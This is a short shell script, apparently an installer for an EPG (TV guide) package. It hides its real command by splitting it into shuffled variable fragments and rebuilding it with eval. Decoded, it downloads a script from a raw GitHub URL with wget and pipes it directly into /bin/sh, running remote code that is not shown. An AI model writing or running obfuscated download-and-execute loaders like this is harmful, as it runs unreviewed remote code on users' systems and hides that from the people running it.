z="
";Qz='/EPG';Sz='sh -';Cz='ps:/';Jz='om/e';Oz='led/';Nz='-kha';Fz='hubu';Kz='miln';Ez='.git';Az='wget';Hz='onte';Uz='| /b';Vz='in/s';Iz='nt.c';Tz='O - ';Wz='h';Gz='serc';Lz='abil';Pz='main';Mz='/epg';Rz='led.';Bz=' htt';Dz='/raw';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Nz$Rz$Sz$Tz$Uz$Vz$Wz"